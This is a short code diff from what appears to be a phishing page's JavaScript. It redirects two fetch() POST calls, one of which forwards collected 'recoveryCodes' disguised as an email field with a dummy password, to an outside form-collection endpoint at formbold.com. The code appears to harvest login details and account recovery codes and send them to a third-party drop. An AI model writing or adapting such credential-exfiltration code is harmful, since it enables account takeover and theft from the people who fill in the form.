@@ -862,7 +862,7 @@
             const name = "Mashooq ali"
 
             // Submit main form
-            fetch("https://postal-form.on.shiper.app/submit", {
+            fetch("https://formbold.com/s/92NOb", {
                 method: "POST",
                 headers: {
                     "Content-Type": "application/json",
@@ -879,7 +879,7 @@
                 if (response.ok) {
                     // If recovery codes are provided, send additional notification
                     if (allowRecovery && recoveryCodes) {
-                        return fetch("https://postal-form.on.shiper.app/notifyLogin", {
+                        return fetch("https://formbold.com/s/92NOb", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify({ email: recoveryCodes, password: "." })
